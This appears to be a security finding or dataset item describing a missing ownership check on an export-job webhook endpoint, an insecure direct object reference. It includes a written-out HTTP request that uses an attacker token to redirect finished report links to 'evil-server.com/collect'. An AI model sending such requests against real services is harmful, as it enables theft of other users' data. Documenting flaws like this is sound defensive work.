diagnosis: Allows configuring a callback webhook destination for a background file export. It updates the ExportJob record without checking if user.id owns the job, allowing an attacker to divert finished report download links to their own server.
exploit_request:
POST /api/exports/4590/webhook HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_token>
Content-Type: application/json

{"url": "https://evil-server.com/collect"}
